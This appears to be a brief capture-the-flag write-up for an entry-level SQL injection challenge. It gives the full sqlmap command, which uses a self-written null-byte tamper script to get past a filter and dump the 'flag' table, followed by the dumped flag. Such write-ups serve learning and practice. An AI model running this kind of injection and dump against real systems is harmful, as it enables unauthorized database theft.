<h1>Okay it's a entry level sqli</h1>
the interesting part here is to write a sqlmap tamper by myself, it's stupid easy as well.

<h1>Solve:</h1>
<pre>
<code>
sqlmap -r header.txt --tamper ./nullbyte.py --technique=U -D news -T flag -C flag --dump --batch
</code>
Database: news
Table: flag
[1 entry]
+--------------------------+
| flag                     |
+--------------------------+
| flag{W4f_bY_paSS_f0R_CI} |
+--------------------------+
    
</pre>
